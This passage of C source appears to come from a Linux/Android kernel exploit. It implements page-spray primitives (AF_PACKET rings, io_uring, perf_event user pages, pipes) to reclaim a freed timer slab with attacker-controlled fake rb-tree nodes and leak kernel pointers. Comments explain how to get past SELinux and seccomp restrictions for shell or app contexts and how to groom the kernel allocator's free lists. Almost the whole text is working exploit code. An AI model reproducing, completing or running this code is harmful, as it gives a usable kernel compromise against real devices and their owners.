 * and rb_next() returns NULL, so the cleanup loop stops after one iteration
 * (no double-add BUG, no __rb_erase_color).
 */

#define IC_REAP_SLOT_STRIDE 0x108U
#define IC_REAP_SLOTS 31U
#define IC_REAP_SPRAY_PAGES 65536UL

struct ic_reap_result {
	unsigned char **pages;
	unsigned long npages;
	uint64_t leak;
	unsigned long leak_page;
	unsigned int leak_off;
	unsigned int hits;
};

static void ic_reap_write_pattern(unsigned char *page, uint64_t pc,
				  uint64_t rb_left)
{
	unsigned int i;
	uint64_t *q;

	/* Node starts for a 4K page that is the first half of the order-1
	 * slab: object k at 0x108*k, timerqueue node at +0x78. */
	for (i = 0; i < 15; i++) {
		q = (uint64_t *)(page + 0x78 + i * IC_REAP_SLOT_STRIDE);
		q[0] = pc;	/* __rb_parent_color */
		q[1] = 0;	/* rb_right */
		q[2] = rb_left;	/* rb_left */
		q[3] = 0;	/* expires */
	}
	/* Object 15 straddles the 4K boundary: its node is at 0xff0, with
	 * rb_left and expires at 0x0/0x8 of the second half's page. */
	q = (uint64_t *)(page + 0xff0);
	q[0] = pc;
	q[1] = 0;
	*(uint64_t *)page = rb_left;
	/* Node starts for a 4K page that is the second half (k=16..30). */
	for (i = 0; i < 15; i++) {
		q = (uint64_t *)(page + 0xf8 + i * IC_REAP_SLOT_STRIDE);
		q[0] = pc;
		q[1] = 0;
		q[2] = rb_left;
		q[3] = 0;
	}
}

/*
 * Reclaim the freed order-1 slab with UNMOVABLE order-0 pages.  Anonymous
 * memory is __GFP_MOVABLE and never lands on a slab page free list, but
 * AIO ring pages are page cache pages allocated with GFP_HIGHUSER (no
 * __GFP_MOVABLE), so they take the same per-CPU unmovable list that the
 * discarded slab pages were drained onto.
 */
static struct ic_aio_spray ic_reap_aio;

/*
 * Pipe spray: each 4K write into an empty pipe slot allocates exactly one
 * order-0 UNMOVABLE page (GFP_HIGHUSER | __GFP_ACCOUNT) and fills it with
 * our bytes.  Unlike io_setup() there are no slab allocations in the
 * allocation path, so the freed threadmgr order-1 slab pages cannot be
 * stolen by inode/kioctx slabs before a user page takes them.  Pipes are
 * created before the pool is freed so that only data pages are allocated
 * during the spray.
 */
#define IC_PIPE_MAX 4096
#define IC_PIPE_DEFAULT 2048
#define IC_PIPE_PAGES 16

#define IC_SOL_PACKET 263
#define IC_PACKET_VERSION 10
#define IC_PACKET_RX_RING 5
#define IC_TPACKET_V2 1
#define IC_PKT_BLOCK 8192UL
#define IC_PKT_DEFAULT 8192U
#define IC_PKT_MAX 32768U

struct ic_tpacket_req {
	unsigned int tp_block_size;
	unsigned int tp_block_nr;
	unsigned int tp_frame_size;
	unsigned int tp_frame_nr;
};

static int ic_pkt_fd = -1;
static void *ic_pkt_map;
static size_t ic_pkt_len;
static unsigned int ic_pkt_blocks;
static unsigned long ic_pkt_block_size = IC_PKT_BLOCK;
static unsigned char *ic_pkt_pages[IC_PKT_MAX];

static int ic_packet_prepare(void)
{
	const char *env = getenv("IC_PKT_BLOCKS");
	unsigned int n = IC_PKT_DEFAULT;
	int ver = IC_TPACKET_V2;
	int fd;

	if (env)
		n = (unsigned int)strtoul(env, NULL, 0);
	if (!n || n > IC_PKT_MAX)
		n = IC_PKT_DEFAULT;
	fd = socket(AF_PACKET, SOCK_RAW, 0);
	if (fd < 0) {
		fprintf(stderr, "[reap] packet socket failed errno=%d\n", errno);
		return -1;
	}
	if (setsockopt(fd, IC_SOL_PACKET, IC_PACKET_VERSION, &ver,
		       sizeof(ver))) {
		fprintf(stderr, "[reap] packet version failed errno=%d\n",
			errno);
		close(fd);
		return -1;
	}
	ic_pkt_fd = fd;
	ic_pkt_blocks = n;
	return 0;
}

static int ic_packet_spray(uint64_t target, struct ic_reap_result *res)
{
	struct ic_tpacket_req req;
	uint64_t pc = 0;
	const char *env = getenv("IC_PC");
	unsigned int b;

	if (env)
		pc = strtoull(env, NULL, 0);
	unsigned long block_size = IC_PKT_BLOCK;
	const char *bs = getenv("IC_PKT_BLOCK");
	unsigned long block_order;

	if (ic_pkt_fd < 0)
		return -1;
	if (bs) {
		unsigned long v = strtoul(bs, NULL, 0);

		if (v >= IC_PAGE && v <= (1UL << 20) && !(v & (IC_PAGE - 1)))
			block_size = v;
	}
	ic_pkt_block_size = block_size;
	block_order = 0;
	for (b = block_size / IC_PAGE; b > 1; b >>= 1)
		block_order++;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = (unsigned int)block_size;
	req.tp_block_nr = ic_pkt_blocks;
	req.tp_frame_size = (unsigned int)block_size;
	req.tp_frame_nr = ic_pkt_blocks;
	if (setsockopt(ic_pkt_fd, IC_SOL_PACKET, IC_PACKET_RX_RING, &req,
		       sizeof(req))) {
		fprintf(stderr, "[reap] packet ring failed errno=%d blocks=%u\n",
			errno, ic_pkt_blocks);
		return -1;
	}
	ic_pkt_len = (size_t)ic_pkt_blocks * block_size;
	ic_pkt_map = mmap(NULL, ic_pkt_len, PROT_READ | PROT_WRITE,
			  MAP_SHARED, ic_pkt_fd, 0);
	if (ic_pkt_map == MAP_FAILED) {
		fprintf(stderr, "[reap] packet mmap failed errno=%d\n", errno);
		ic_pkt_map = NULL;
		return -1;
	}
	memset(res, 0, sizeof(*res));
	for (b = 0; b < ic_pkt_blocks; b++) {
		unsigned char *p = (unsigned char *)ic_pkt_map +
			(size_t)b * block_size;
		unsigned long q;

		for (q = 0; q < block_size / IC_PAGE; q++) {
			ic_reap_write_pattern(p + q * IC_PAGE, pc, target);
			ic_pkt_pages[res->npages++] = p + q * IC_PAGE;
		}
	}
	res->pages = ic_pkt_pages;
	fprintf(stderr, "[reap] packet blocks=%u order=%lu pages=%lu\n",
		ic_pkt_blocks, block_order, res->npages);
	return 0;
}

static void ic_packet_cleanup(void)
{
	if (ic_pkt_map) {
		munmap(ic_pkt_map, ic_pkt_len);
		ic_pkt_map = NULL;
	}
	if (ic_pkt_fd >= 0) {
		close(ic_pkt_fd);
		ic_pkt_fd = -1;
	}
}

/*
 * io_uring order-1 raw-page spray.
 *
 * io_uring_setup(sq_entries=128) allocates two order-1 blocks before the
 * fd is returned, both through __alloc_pages(GFP_KERNEL|__GFP_ZERO|
 * __GFP_NOWARN|__GFP_COMP|__GFP_ACCOUNT, 1), i.e. the order-1 unmovable
 * pcp list (pindex = 1*MIGRATE_PCPTYPES + 0) that a discarded
 * posix_timers_cache order-1 slab lands on:
 *
 *   - struct io_rings plus the sq_array: 0x140 + 2*128*16 + 128*4 bytes
 *     (cq_entries defaults to 2*sq_entries) -> 0x1340, order 1;
 *   - the SQE array: 128 * 64 = 8192 bytes -> order 1.
 *
 * Both are exposed writable to the caller through io_uring_mmap_pages()
 * + vm_insert_pages(), so we can paint the fake rb-node pattern into the
 * whole 8 KiB block.  A pipe page, by contrast, is an order-0 request and
 * only ever consults pcp list pindex 0, which is why the pipe spray could
 * never take the order-1 slab even after the skb flush.
 *
 * The fds are kept open so the blocks stay allocated until after the reap.
 */
#define IC_IORING_MAX 4096
#define IC_IORING_DEFAULT 512
#define IC_IORING_SQ 128
#define IC_IORING_OFF_SQ_RING 0UL
#define IC_IORING_OFF_SQES 0x10000000UL
#define IC_IORING_BLOCK (IC_IORING_SQ * 64)	/* 8192, order 1 */

#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif

struct ic_ioring_spray {
	int *fds;
	unsigned char **rings;
	unsigned char **sqes;
	unsigned char **scan;
	unsigned int count;
	unsigned int nscan;
	unsigned long blocks;
};

static struct ic_ioring_spray ic_iorings;

static int ic_ioring_setup_one(unsigned int idx)
{
	unsigned char params[0x78];
	unsigned char *base;
	unsigned long sz = IC_IORING_BLOCK;
	int fd;

	memset(params, 0, sizeof(params));
	*(uint32_t *)params = IC_IORING_SQ;
	fd = (int)syscall(SYS_io_uring_setup, IC_IORING_SQ, params);
	if (fd < 0)
		return -1;
	ic_iorings.fds[idx] = fd;
	base = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		    IC_IORING_OFF_SQES);
	if (base == MAP_FAILED) {
		fprintf(stderr, "[reap] ioring sqes mmap failed errno=%d\n",
			errno);
		return -1;
	}
	ic_iorings.sqes[idx] = base;
	base = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		    IC_IORING_OFF_SQ_RING);
	if (base == MAP_FAILED) {
		fprintf(stderr, "[reap] ioring ring mmap failed errno=%d\n",
			errno);
		return -1;
	}
	ic_iorings.rings[idx] = base;
	return 0;
}

static int ic_ioring_spray(uint64_t target, struct ic_reap_result *res)
{
	const char *env = getenv("IC_IORINGS");
	unsigned int want = IC_IORING_DEFAULT;
	uint64_t pc = 0;
	unsigned int i;
	struct rlimit rl;

	env = getenv("IC_PC");
	if (env)
		pc = strtoull(env, NULL, 0);
	env = getenv("IC_IORINGS");
	if (env)
		want = (unsigned int)strtoul(env, NULL, 0);
	if (!want)
		want = IC_IORING_DEFAULT;
	if (want > IC_IORING_MAX)
		want = IC_IORING_MAX;
	if (!getrlimit(RLIMIT_NOFILE, &rl) && rl.rlim_cur < want + 64) {
		rl.rlim_cur = want + 64;
		if (rl.rlim_max < rl.rlim_cur)
			rl.rlim_max = rl.rlim_cur;
		(void)setrlimit(RLIMIT_NOFILE, &rl);
	}
	if (!ic_iorings.fds) {
		ic_iorings.fds = calloc(want, sizeof(int));
		ic_iorings.rings = calloc(want, sizeof(unsigned char *));
		ic_iorings.sqes = calloc(want, sizeof(unsigned char *));
		ic_iorings.scan = calloc((size_t)want * 4,
					 sizeof(unsigned char *));
		if (!ic_iorings.fds || !ic_iorings.rings ||
		    !ic_iorings.sqes || !ic_iorings.scan)
			return -1;
		for (i = 0; i < want; i++)
			ic_iorings.fds[i] = -1;
	}
	for (i = 0; i < want; i++) {
		if (ic_ioring_setup_one(i)) {
			fprintf(stderr,
				"[reap] ioring setup stopped at %u errno=%d\n",
				i, errno);
			break;
		}
		ic_reap_write_pattern(ic_iorings.sqes[i], pc, target);
		ic_reap_write_pattern(ic_iorings.sqes[i] + IC_PAGE, pc,
				      target);
		ic_reap_write_pattern(ic_iorings.rings[i], pc, target);
		ic_reap_write_pattern(ic_iorings.rings[i] + IC_PAGE, pc,
				      target);
		ic_iorings.scan[ic_iorings.nscan++] = ic_iorings.sqes[i];
		ic_iorings.scan[ic_iorings.nscan++] =
			ic_iorings.sqes[i] + IC_PAGE;
		ic_iorings.scan[ic_iorings.nscan++] = ic_iorings.rings[i];
		ic_iorings.scan[ic_iorings.nscan++] =
			ic_iorings.rings[i] + IC_PAGE;
		ic_iorings.blocks += 2;
	}
	ic_iorings.count = i;
	fprintf(stderr, "[reap] ioring rings=%u order1 blocks=%lu\n",
		ic_iorings.count, ic_iorings.blocks);
	memset(res, 0, sizeof(*res));
	res->pages = ic_iorings.scan;
	res->npages = ic_iorings.nscan;
	return i ? 0 : -1;
}

static void ic_ioring_cleanup(void)
{
	unsigned int i;

	if (!ic_iorings.fds)
		return;
	for (i = 0; i < ic_iorings.count; i++) {
		if (ic_iorings.sqes && ic_iorings.sqes[i])
			munmap(ic_iorings.sqes[i], IC_IORING_BLOCK);
		if (ic_iorings.rings && ic_iorings.rings[i])
			munmap(ic_iorings.rings[i], IC_IORING_BLOCK);
		if (ic_iorings.fds[i] >= 0)
			close(ic_iorings.fds[i]);
	}
}

/*
 * perf user_page spray (order-0 UNMOVABLE, user-writable).
 *
 * perf_event_open(pid=0, cpu=-1) followed by mmap(NULL, 4096, RW,
 * MAP_SHARED, fd, 0) goes through perf_mmap(): vma_size/PAGE_SIZE-1 == 0
 * data pages, so rb_alloc() allocates exactly one page through
 * alloc_pages_node(node, GFP_KERNEL | __GFP_ZERO, 0) and maps it at
 * offset 0 of the vma.  That user_page is read/write for the caller and
 * UNMOVABLE, which is what an order-0 split of a freed posix_timers_cache
 * order-1 block produces.  No data page (pgoff != 0, read-only) is
 * allocated at all for a 4K mapping.
 *
 * Device viability: SELinux grants shell (and runas_app) the perf_event
 * open/read/write permissions but neverallow cpu/tracepoint, and
 * security_perf_event_open() is only consulted for the KERNEL permission
 * when !attr.exclude_kernel, so flags bit 5 is set.  perf_event_open is in
 * the bionic common seccomp allowlist, and the device runs
 * perf_event_paranoid=-1, which also skips the RLIMIT_MEMLOCK accounting
 * in perf_mmap().  io_uring (the order-1 spray the 15.0 chain uses) is
 * denied by the anon_inode class check for shell/untrusted_app, and
 * AF_PACKET rings are denied for shell, so this is the only remaining
 * user-mapped allocation family on the device.
 *
 * rb_alloc() also kzalloc_node()s struct perf_buffer (kmalloc-256, an
 * order-1 slab: 32 objects), and it does so BEFORE the user page, so every
 * 32 spray mmaps allocate a fresh 8K slab page that competes for the very
 * order-1 blocks the sweep is trying to hand to the user pages.  observed:
 * 1024 events grew kmalloc-256 from 21 to 52 slabs (+31), and in the 4096
 * event keep-pool run the victim slab itself came back zeroed (a kzalloc'd
 * perf_buffer), giving a silent "[peak] no leak" with no rb_erase panic.
 * ic_perf_prepare() therefore mmap+munmap()s every pre-opened event once,
 * before the victim exists, which frees one perf_buffer slot per event into
 * the cache (rb_free_rcu: the free is RCU-deferred, hence the settle), and
 * then eats the warm-up's freed order-0 user pages by faulting one data
 * page into each fresh 2 MB region (PTE pages are order-0 UNMOVABLE; the
 * data page is MOVABLE).  At spray time no order-1 slab is requested and
 * the order-0 UNMOVABLE free lists start as empty as they were.
 */
#define IC_PERF_MAX 32768
#define IC_PERF_DEFAULT 8192
#define IC_PERF_TYPE_SOFTWARE 1
#define IC_PERF_COUNT_SW_DUMMY 9
#define IC_PERF_EXCLUDE_KERNEL (1ULL << 5)

struct ic_perf_attr {
	uint32_t type;
	uint32_t size;
	uint64_t config;
	uint64_t sample_period;
	uint64_t sample_type;
	uint64_t read_format;
	uint64_t flags;
	uint32_t wakeup_events;
	uint32_t bp_type;
	uint64_t config1;
	uint64_t config2;
};

static int *ic_perf_fds;
static void **ic_perf_maps;
static unsigned char **ic_perf_pages;
static int *ic_perf_hold_fds;
static void **ic_perf_hold_maps;
static unsigned int ic_perf_nready;
static unsigned int ic_perf_count;
static void *ic_perf_fixed_base;
static size_t ic_perf_fixed_len;
static unsigned int ic_perf_fixed_slots;
static void **ic_perf_fixed_addrs;

static int ic_perf_open_one(void)
{
	struct ic_perf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.type = IC_PERF_TYPE_SOFTWARE;
	attr.size = sizeof(attr);
	attr.config = IC_PERF_COUNT_SW_DUMMY;
	/* exclude_kernel: skips perf_allow_kernel() and therefore the
	 * SELinux KERNEL permission check (shell has only open/read/write). */
	attr.flags = IC_PERF_EXCLUDE_KERNEL;
	attr.wakeup_events = 1;
	return (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
}

static int ic_reap_use_perf(void)
{
	const char *env = getenv("IC_SPRAY");

	return env && !strcmp(env, "perf");
}

/* Drain n order-0 UNMOVABLE pages by faulting one byte into each freshly
 * mapped 2 MB region.  The fault allocates the PTE page (GFP_PGTABLE_USER:
 * order 0, UNMOVABLE) and then the data page (MOVABLE), so exactly the
 * migratetype we care about is consumed.  The mapping is kept and marked
 * MADV_DONTFORK so the victim forks do not copy a single PTE. */
static void *ic_perf_eat_map;

static void ic_perf_eat_unmovable(unsigned long n)
{
	const size_t stride = 2UL << 20;
	unsigned char *m;
	unsigned long i;

	if (!n)
		return;
	m = mmap(NULL, (size_t)n * stride, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
	if (m == MAP_FAILED) {
		fprintf(stderr, "[perf] eat mmap failed errno=%d\n", errno);
		return;
	}
	(void)madvise(m, (size_t)n * stride, MADV_DONTFORK);
	for (i = 0; i < n; i++)
		m[i * stride] = 1;
	ic_perf_eat_map = m;
	fprintf(stderr, "[perf] ate=%lu unmovable pages\n", n);
}

/* Reserve the address range the spray will MAP_FIXED into and pre-allocate
 * its page tables.  One order-1 timer slab is freed before every spray; the
 * first order-0 Unmovable allocation afterwards splits it into two pages and
 * the pcp consumes them in fill order.  In one mmap() the kernel allocates
 * the vma (cache), then rb_alloc()'s perf_buffer (kmalloc-256 cache), then
 * the order-0 user page, and only then remap_pfn_range()'s PTE page and the
 * maple-tree preallocation.  If those page-table and vma/maple allocations
 * are moved out of the spray (page tables prefaulted here, vmas stocked by
 * ic_perf_vma_warm()), every order-0 buddy allocation of the spray is a
 * perf user page, so both halves of the freed order-1 block land in pages
 * we can pattern no matter where the pcp refill puts them.
 *
 * The slots are left unmapped.  free_pgd_range() frees the PTE page of a
 * PMD unless the unmapped run is clipped out by floor/ceiling, and an
 * unaligned run starting below a PMD boundary is NOT clipped if it ends
 * inside the same PMD -- it frees that table even when a vma there stays
 * mapped.  So the window is split per PMD: in each 2 MB range the last 4K
 * page stays mapped as an "anchor" and the run to unmap ends exactly at
 * the anchor's start, in the anchor's own PMD; the ceiling masking then
 * drops the run's last PMD and the table survives.  With the page tables
 * of every slot prefaulted and kept, remap_pfn_range() inside the spray
 * never allocates one.  A MAP_FIXED into an unmapped slot makes
 * do_mas_munmap() return before its mas_preallocate(), so nothing
 * maple-related is allocated before call_mmap(); with the vma cache
 * stocked the mmap's first buddy request is rb_alloc()'s user page. */
static int ic_perf_window_setup(unsigned int slots)
{
	const size_t pmd_sz = 2UL << 20;
	size_t need = (size_t)slots * IC_PAGE;
	size_t len = ((need + pmd_sz - 1) & ~(pmd_sz - 1)) + 3 * pmd_sz;
	unsigned char *base, *wend;
	unsigned long first, last, p;
	unsigned int n = 0;
	void **addrs;
	size_t off;

	if (!slots)
		return -1;
	addrs = calloc(slots, sizeof(*addrs));
	if (!addrs)
		return -1;
	base = mmap(NULL, len, PROT_READ | PROT_WRITE,
		    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
	if (base == MAP_FAILED) {
		fprintf(stderr, "[perf] fixed window mmap failed errno=%d\n",
			errno);
		free(addrs);
		return -1;
	}
	wend = base + len;
	/* Fault one byte in every PMD the window overlaps: that allocates
	 * the order-0 PTE page, which the anchoring below keeps alive. */
	for (off = 0; off < len; off += pmd_sz)
		base[off] = 0;
	base[len - IC_PAGE] = 0;
	first = (unsigned long)base & ~(pmd_sz - 1);
	last = ((unsigned long)wend - 1) & ~(pmd_sz - 1);
	for (p = first; p <= last; p += pmd_sz) {
		unsigned char *ps = (unsigned char *)(p < (unsigned long)base
						     ? (unsigned long)base : p);
		unsigned char *pe = (unsigned char *)(p + pmd_sz >
						     (unsigned long)wend
						     ? (unsigned long)wend
						     : p + pmd_sz);
		unsigned char *anchor;

		if (pe - ps < (long)(2 * IC_PAGE)) {
			/* Too small to hold slots plus an anchor: leave the
			 * remainder mapped whole. */
			(void)madvise(ps, pe - ps, MADV_DONTFORK);
			continue;
		}
		anchor = pe - IC_PAGE;
		(void)munmap(ps, anchor - ps);
		(void)madvise(anchor, IC_PAGE, MADV_DONTFORK);
		while (ps + IC_PAGE <= anchor && n < slots) {
			addrs[n] = ps;
			n++;
			ps += IC_PAGE;
		}
	}
	if (n < slots) {
		fprintf(stderr, "[perf] fixed window short: %u < %u slots\n",
			n, slots);
		(void)munmap(base, len);
		free(addrs);
		return -1;
	}
	ic_perf_fixed_base = base;
	ic_perf_fixed_len = len;
	ic_perf_fixed_slots = slots;
	ic_perf_fixed_addrs = addrs;
	fprintf(stderr, "[perf] fixed window base=%p len=%zu slots=%u\n",
		base, len, slots);
	return 0;
}

static void *ic_perf_fixed_addr(unsigned int i)
{
	return ic_perf_fixed_addrs[i];
}

/* Stock the vm_area_struct cache.  Every keep-th mapping stays mapped, so
 * each slab that received a kept object keeps ~objs_per_slab - objs/keep
 * free slots and is never discarded (an empty slab is dropped once
 * min_partial is satisfied).  The victims fork/exec after this, but their
 * copies are marked MADV_DONTFORK and skip these vmas entirely. */
static void ic_perf_vma_warm(unsigned long n, unsigned long keep)
{
	void **m;
	unsigned long i, kept = 0, freed = 0;

	if (!n || keep < 2)
		return;
	m = calloc(n, sizeof(*m));
	if (!m)
		return;
	/* Alternate the protection: two adjacent anonymous PROT_NONE
	 * mappings are mergeable and vma_merge() would collapse the whole
	 * warm stream into a handful of vmas, leaving the cache unstocked. */
	for (i = 0; i < n; i++)
		m[i] = mmap(NULL, IC_PAGE, (i & 1) ? PROT_READ : PROT_NONE,
			    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE,
			    -1, 0);
	for (i = 0; i < n; i++) {
		if (m[i] == MAP_FAILED)
			continue;
		if (i % keep == 0) {
			(void)madvise(m[i], IC_PAGE, MADV_DONTFORK);
			kept++;
		} else {
			(void)munmap(m[i], IC_PAGE);
			freed++;
		}
	}
	fprintf(stderr, "[perf] vma warm=%lu kept=%lu freed=%lu\n",
		n, kept, freed);
	free(m);
}

static int ic_perf_prepare(void)
{
	const char *env = getenv("IC_PERF_EVENTS");
	unsigned long want = IC_PERF_DEFAULT;
	struct rlimit rl;
	unsigned int made = 0, i;
	int first_errno = 0;

	env = getenv("IC_PERF_EVENTS");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		if (v && v <= IC_PERF_MAX)
			want = v;
	}
	/* Warm perf_event_cache and the ring_buffer kmalloc caches; the
	 * mmap/close also shows the user page is allocatable before the
	 * chain depends on it. */
	for (i = 0; i < 32; i++) {
		void *m;
		int fd = ic_perf_open_one();

		if (fd < 0)
			break;
		m = mmap(NULL, IC_PAGE, PROT_READ | PROT_WRITE, MAP_SHARED,
			 fd, 0);
		if (m != MAP_FAILED) {
			*(volatile unsigned char *)m = 0;
			(void)munmap(m, IC_PAGE);
		}
		close(fd);
	}
	if (!getrlimit(RLIMIT_NOFILE, &rl) && rl.rlim_cur < rl.rlim_max) {
		rl.rlim_cur = rl.rlim_max;
		(void)setrlimit(RLIMIT_NOFILE, &rl);
	}
	if (!getrlimit(RLIMIT_NOFILE, &rl) && rl.rlim_cur > 64) {
		unsigned long room = (unsigned long)rl.rlim_cur - 48;

		if (room < want)
			want = room;
	}
	if (!ic_perf_fds) {
		ic_perf_fds = calloc(IC_PERF_MAX, sizeof(*ic_perf_fds));
		ic_perf_maps = calloc(IC_PERF_MAX, sizeof(*ic_perf_maps));
		ic_perf_pages = calloc(IC_PERF_MAX, sizeof(*ic_perf_pages));
		if (!ic_perf_fds || !ic_perf_maps || !ic_perf_pages)
			return -1;
	}
	for (i = 0; i < want; i++) {
		int fd = ic_perf_open_one();

		if (fd < 0) {
			if (!first_errno)
				first_errno = errno;
			break;
		}
		ic_perf_fds[made++] = fd;
	}
	ic_perf_nready = made;
	fprintf(stderr, "[perf] preopened=%u/%lu errno=%d\n", made, want,
		first_errno);
	if (!made)
		return -1;
	/* Fill the kmalloc-256 ring-buffer cache before the victim exists:
	 * one mmap allocates one perf_buffer from the cache and munmap frees
	 * it again through call_rcu().  A plain warm-up only retains about
	 * min_partial(5)+cpu_partial slabs before SLUB starts handing the
	 * empty ones back to the buddy, so IC_PERF_HOLD=k instead allocates
	 * all warm events first (kept mapped), then unmaps all but every
	 * k-th: in every 32 consecutive allocations (one slab) four stay
	 * allocated, so the slab stays on the partial list and keeps its
	 * free objects until the spray. */
	{
		const char *we = getenv("IC_PERF_WARM");
		const char *he = getenv("IC_PERF_HOLD");
		unsigned long warm = made;
		unsigned long hold = 0;
		unsigned long eat;
		unsigned long freed = 0;
		unsigned long j;
		struct timespec settle = { 0, 300000000L };

		if (we) {
			unsigned long v = strtoul(we, NULL, 0);

			if (v <= made)
				warm = v;
		}
		if (he) {
			unsigned long v = strtoul(he, NULL, 0);

			if (v >= 2)
				hold = v;
		}
		if (hold) {
			/* 25% margin: the spray reuses these slots one per
			 * event, and a few slabs at the allocation-stream
			 * seams may still be discarded. */
			unsigned long extra = (warm + warm / 4 + 64) * hold /
					      (hold - 1) + 32;
			unsigned long room = 0;

			if (!getrlimit(RLIMIT_NOFILE, &rl) &&
			    rl.rlim_cur > (rlim_t)made + 64)
				room = (unsigned long)rl.rlim_cur - made - 64;
			if (extra > room)
				extra = room;
			ic_perf_hold_fds = calloc(extra ? extra : 1,
						  sizeof(int));
			ic_perf_hold_maps = calloc(extra ? extra : 1,
						   sizeof(void *));
			for (j = 0; j < extra; j++) {
				int fd = ic_perf_open_one();

				if (fd < 0)
					break;
				ic_perf_hold_fds[j] = fd;
			}
			for (j = 0; j < extra; j++) {
				void *m;

				if (!ic_perf_hold_fds[j])
					continue;
				m = mmap(NULL, IC_PAGE,
					 PROT_READ | PROT_WRITE, MAP_SHARED,
					 ic_perf_hold_fds[j], 0);
				if (m == MAP_FAILED)
					continue;
				*(volatile unsigned char *)m = 0;
				ic_perf_hold_maps[j] = m;
			}
			for (j = 0; j < extra; j++) {
				if (!ic_perf_hold_maps[j] || j % hold == 0)
					continue;
				(void)munmap(ic_perf_hold_maps[j], IC_PAGE);
				ic_perf_hold_maps[j] = NULL;
				freed++;
			}
			fprintf(stderr,
				"[perf] hold=%lu alloc=%lu freed=%lu\n",
				hold, extra, freed);
		} else {
			for (j = 0; j < warm; j++) {
				void *m = mmap(NULL, IC_PAGE,
					       PROT_READ | PROT_WRITE,
					       MAP_SHARED, ic_perf_fds[j], 0);

				if (m == MAP_FAILED)
					break;
				*(volatile unsigned char *)m = 0;
				(void)munmap(m, IC_PAGE);
				freed++;
			}
			fprintf(stderr, "[perf] warmed=%lu slots\n", freed);
		}
		if (getenv("IC_PERF_FIXED")) {
			const char *wen = getenv("IC_PERF_VMA_WARM");
			const char *wkn = getenv("IC_PERF_VMA_KEEP");
			unsigned long vn = 4096, vk = 4;

			if (wen) {
				unsigned long v = strtoul(wen, NULL, 0);

				if (v && v <= 16384)
					vn = v;
			}
			if (wkn) {
				unsigned long v = strtoul(wkn, NULL, 0);

				if (v >= 2 && v <= 64)
					vk = v;
			}
			/* Warm first: the window's holes must not exist yet,
			 * or mmap(NULL) could drop a warm mapping into one
			 * and the spray would have to munmap it (a maple
			 * preallocation before call_mmap()). */
			ic_perf_vma_warm(vn, vk);
			if (ic_perf_window_setup(made))
				fprintf(stderr,
					"[perf] fixed window failed, plain mmap\n");
		}
		/* rb_free_rcu() frees both the perf_buffer and the user page
		 * from an RCU callback, so munmap() returning means nothing
		 * is back on the buddy yet. */
		(void)nanosleep(&settle, NULL);
		env = getenv("IC_PERF_EAT");
		eat = freed;
		if (env)
			eat = strtoul(env, NULL, 0);	/* 0 disables */
		if (eat > freed)
			eat = freed;
		ic_perf_eat_unmovable(eat);
	}
	return 0;
}

static int ic_perf_spray(uint64_t target, struct ic_reap_result *res)
{
	uint64_t pc = 0;
	const char *env = getenv("IC_PC");
	unsigned int i;
	int err = 0;

	if (env)
		pc = strtoull(env, NULL, 0);
	if (!ic_perf_fds || !ic_perf_nready) {
		fprintf(stderr, "[perf] spray not prepared\n");
		return -1;
	}
	ic_perf_count = 0;
	for (i = 0; i < ic_perf_nready; i++) {
		void *m;

		if (ic_perf_fixed_base && i < ic_perf_fixed_slots) {
			void *want = ic_perf_fixed_addr(i);

			m = mmap(want, IC_PAGE, PROT_READ | PROT_WRITE,
				 MAP_SHARED | MAP_FIXED, ic_perf_fds[i], 0);
		} else {
			m = mmap(NULL, IC_PAGE, PROT_READ | PROT_WRITE,
				 MAP_SHARED, ic_perf_fds[i], 0);
		}
		if (m == MAP_FAILED) {
			err = errno;
			break;
		}
		ic_perf_maps[ic_perf_count] = m;
		ic_perf_pages[ic_perf_count] = m;
		ic_reap_write_pattern(m, pc, target);
		ic_perf_count++;
	}
	/* Every page is a lone 4K half of the order-1 block: the in-page
	 * fake window is the only zone that is guaranteed to be ours. */
	ic_force_inpage = 1;
	fprintf(stderr, "[perf] spray pages=%u errno=%d\n", ic_perf_count,
		err);
	memset(res, 0, sizeof(*res));
	res->pages = ic_perf_pages;
	res->npages = ic_perf_count;
	return ic_perf_count ? 0 : -1;
}

static void ic_perf_cleanup(void)
{
	unsigned int i;

	if (!ic_perf_maps)
		return;
	for (i = 0; i < ic_perf_count; i++) {
		if (ic_perf_maps[i])
			(void)munmap(ic_perf_maps[i], IC_PAGE);
	}
	ic_perf_count = 0;
}

struct ic_pipe_spray {
	int (*fds)[2];
	unsigned int count;
	unsigned int pages;
	unsigned char *pattern;
	unsigned long written;
};

static struct ic_pipe_spray ic_pipes;

static int ic_pipe_prepare(void)
{
	const char *env = getenv("IC_PIPES");
	unsigned int want = IC_PIPE_DEFAULT;
	struct rlimit rl = { 0, 0 };
	unsigned int i;

	if (env)
		want = (unsigned int)strtoul(env, NULL, 0);
	if (want > IC_PIPE_MAX)
		want = IC_PIPE_MAX;
	if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
		if (rl.rlim_cur < rl.rlim_max) {
			rl.rlim_cur = rl.rlim_max;
			(void)setrlimit(RLIMIT_NOFILE, &rl);
		}
		if (rl.rlim_cur < (rlim_t)want * 2 + 32) {
			unsigned long lim = rl.rlim_cur > 32 ?
				((unsigned long)rl.rlim_cur - 32) / 2 : 0;

			if (lim < want)
				want = (unsigned int)lim;
		}
	}
	ic_pipes.fds = calloc(want ? want : 1, sizeof(*ic_pipes.fds));
	ic_pipes.pattern = malloc(IC_PAGE);
	if (!ic_pipes.fds || !ic_pipes.pattern)
		return -1;
	for (i = 0; i < want; i++) {
		if (pipe2(ic_pipes.fds[i], O_CLOEXEC | O_NONBLOCK))
			break;
	}
	ic_pipes.count = i;
	ic_pipes.pages = IC_PIPE_PAGES;
	env = getenv("IC_PIPE_PAGES");
	if (env) {
		unsigned int p = (unsigned int)strtoul(env, NULL, 0);

		if (p && p < ic_pipes.pages)
			ic_pipes.pages = p;
	}
	fprintf(stderr, "[reap] pipes=%u pages_each=%u\n", ic_pipes.count,
		ic_pipes.pages);
	return ic_pipes.count ? 0 : -1;
}

